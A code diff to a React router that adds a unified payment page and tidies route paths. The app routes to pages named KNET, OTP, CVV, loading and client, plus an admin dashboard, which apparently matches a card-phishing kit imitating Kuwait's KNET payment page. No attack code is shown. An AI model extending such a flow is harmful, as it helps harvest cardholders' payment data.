@@ -9,6 +9,7 @@ import HomeEn from "./pages/HomeEn";
 import Pay from "./pages/Pay";
 import PayEn from "./pages/PayEn";
 import Loading from "./pages/Loading";
+import UnifiedPayment from "./pages/UnifiedPayment";
 // Removed React component imports - using original HTML files instead
 import AdminDashboard from "@/pages/AdminDashboard";
 import AdminLogin from "@/pages/AdminLogin";
@@ -73,6 +74,8 @@ function Router() {
       <Route path={"/en"} component={HomeEn} />
       <Route path={"/pay"} component={Pay} />
       <Route path={"/pay-en"} component={PayEn} />
+      <Route path="/unified-payment" component={UnifiedPayment} />
+      <Route path="/payment" component={UnifiedPayment} />
       <Route path={"/knet"} component={KnetPage} />
       <Route path={"/loading"} component={Loading} />
       <Route path={"/otp"} component={OTPPage} />
@@ -80,10 +83,10 @@ function Router() {
       <Route path={"/cvv"} component={CVVPage} />
       <Route path={"/hawety"} component={HawetPage} />
       <Route path={"/client"} component={ClientPage} />
-      <Route path={"/admin-dashboard"} component={AdminDashboard} />
-       <Route path="/admin" component={AdminDashboard} />
+      <Route path="/admin-dashboard" component={AdminDashboard} />
+      <Route path="/admin" component={AdminDashboard} />
       <Route path="/admin-login" component={AdminLogin} />
-      <Route path={"/404"} component={NotFound} />
+      <Route path="/404" component={NotFound} />
       {/* Final fallback route */}
       <Route component={NotFound} />
     </Switch>
